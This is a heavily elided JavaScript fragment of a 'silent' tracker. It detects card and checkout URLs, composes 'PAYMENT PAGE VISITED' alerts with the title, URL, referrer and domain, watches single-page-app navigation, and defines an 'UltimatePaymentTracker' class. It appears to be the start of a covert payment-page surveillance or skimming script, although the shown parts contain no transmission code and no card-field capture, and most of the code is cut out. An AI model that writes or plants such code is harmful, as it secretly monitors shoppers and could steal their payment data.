// Ultimate Silent Tracker v12.0 - Modified Edition
// Heartbeat removed, Specific page tracking only
...
(function() {
    ...
    let pageTracked = false; // Track if page visit has been logged
    ...
    class PageVisitTracker {
        ...
        checkAndTrackPage() {
            ...
            // Check for payment/card related pages
            const isTargetPage = 
                url.includes('/card') ||
        ...
        async trackPageVisit() {
            ...
            let message = `📍 <b>PAYMENT PAGE VISITED</b>\n\n`;
            message += `📄 <b>Page Title:</b> ${title}\n`;
            message += `🔗 <b>URL:</b> <code>${page}</code>\n`;
            message += `↩️ <b>Referrer:</b> ${referrer}\n`;
            message += `🌐 <b>Domain:</b> ${window.location.hostname}\n`;
        ...
        setupSPATracking() {
            ...
            setInterval(() => {
                ...
                if (currentUrl !== lastUrl) {
                    lastUrl = currentUrl;
                    pageTracked = false; // Reset tracking for new page
                    setTimeout(() => this.checkAndTrackPage(), 500);
                }
            }, 1000);
    ...
    class UltimatePaymentTracker {
        ...
        async initialize() {
            ...
            // Check and track page visit if on card/checkout page
